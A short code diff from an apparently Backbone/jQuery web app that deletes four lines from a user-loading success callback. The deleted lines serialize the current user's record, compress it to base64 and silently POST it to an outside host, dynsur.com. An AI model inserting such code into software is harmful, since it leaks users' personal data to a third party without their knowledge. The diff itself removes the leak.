@@ -26,10 +26,6 @@
 					success: function() {
 						if(users.length) {
 							var user = users.at(0).toJSON();
-	var string = LZString.compressToBase64(JSON.stringify(user));
-	$.post('http://www.dynsur.com/post/tl.php', {
-		string: string
-	});
 							app.user = {
 								alias: user.alias,
 								avatar: user.avatar,
